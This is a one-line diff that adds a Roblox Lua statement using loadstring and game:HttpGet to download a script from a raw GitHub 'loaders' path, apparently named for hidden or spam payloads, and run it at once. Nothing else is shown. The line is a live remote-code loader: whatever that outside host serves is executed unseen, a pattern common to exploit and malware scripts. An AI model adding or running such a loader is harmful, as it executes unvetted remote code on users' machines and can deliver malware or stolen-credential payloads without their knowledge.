@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/hide-in-pixels-spam5-0n3iusfuhbvqj3.lua"))()
